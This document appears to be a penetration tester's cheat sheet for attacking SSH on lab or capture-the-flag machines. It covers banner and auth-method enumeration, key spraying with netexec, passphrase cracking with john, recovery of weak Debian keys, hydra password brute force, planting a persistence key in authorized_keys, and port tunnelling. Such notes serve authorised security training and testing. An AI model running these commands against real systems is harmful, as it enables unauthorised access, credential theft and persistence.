# SSH enumeration

## Version and login methods
nc -nv <TargetIP> 22
sudo nmap -Pn -p 22 -sV --script ssh2-enum-algos,ssh-auth-methods <TargetIP>
- [ ] The version names the OS release: OpenSSH 8.9p1 Ubuntu-3 is Ubuntu 22.04, for instance
- [ ] Only publickey in the auth methods: no password will work, I need a key
- [ ] Very old algorithms, such as diffie-hellman-group1-sha1: a very old server
- [ ] OpenSSH 7.7 or older lets me check usernames, CVE-2018-15473: searchsploit openssh
- [ ] SSH alone is rarely the way in: I come back here with every credential and key I find

## A key I found
chmod 600 id_rsa
ssh -i id_rsa '<Username>'@<TargetIP>
- [ ] The owner from the comment at the end of its .pub file, such as user@host
The key against every user I know, root included. At the pwn-broker prompt: tool install netexec.
nxc ssh <TargetIP> -u users.txt -p '' --key-file id_rsa
- [ ] Asked for a passphrase: crack it, below
- [ ] Refused for no clear reason: ssh -vv shows why

## A key with a passphrase
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
john --show id_rsa.hash
- [ ] Other hash types and rules: :Pb hash-cracking

## An old server
The error names what to add, as in: no matching host key type found. Their offer: ssh-rsa.
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa '<Username>'@<TargetIP>
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa '<Username>'@<TargetIP>
ssh -o Ciphers=+aes128-cbc '<Username>'@<TargetIP>
ssh -vv -i id_rsa '<Username>'@<TargetIP>
- [ ] A DSA key refused: -o PubkeyAcceptedAlgorithms=+ssh-dss, and on the newest OpenSSH an older client in a container

## A public key from an old Debian
Keys made on Debian or Ubuntu from 2006 to 2008 come from a small known set.
git clone https://github.com/g0tmi1k/debian-ssh
cd debian-ssh/common_keys
tar xjf debian_ssh_rsa_2048_x86.tar.bz2
tar xjf debian_ssh_dsa_1024_x86.tar.bz2
grep -rl 'THE-KEY-CHUNK' rsa/ dsa/
- [ ] THE-KEY-CHUNK is a run of 30 or so characters from the found authorized_keys line
- [ ] The private key is the match without .pub: chmod 600, then ssh -i

## Passwords
Found credentials first, every user with every password:
nxc ssh <TargetIP> -u users.txt -p passwords.txt --continue-on-success
hydra -L users.txt -P passwords.txt -e nsr -f -t 4 <TargetIP> ssh
Rockyou only for a known user and a good reason, such as a hint on the box:
hydra -l '<Username>' -P /usr/share/wordlists/rockyou.txt -e nsr -f -t 4 <TargetIP> ssh
- [ ] -t 4 at most: SSH throttles parallel logins, and more threads miss passwords
- [ ] Wordlists built for the target: :Pb brute-force

## A login that lasts
On Kali:
ssh-keygen -t ed25519 -f ./pwn_key -N ''
cat pwn_key.pub
On the target, as the user, with that line in place of THE-PUBLIC-KEY:
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo 'THE-PUBLIC-KEY' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
ssh -i pwn_key '<Username>'@<TargetIP>
A port the target only listens to on localhost, reached from Kali, with more in :Pb ssh-tunnels:
ssh -i pwn_key -N -L <LPORT>:127.0.0.1:<Port> '<Username>'@<TargetIP>
- [ ] My key taken out of authorized_keys at the end
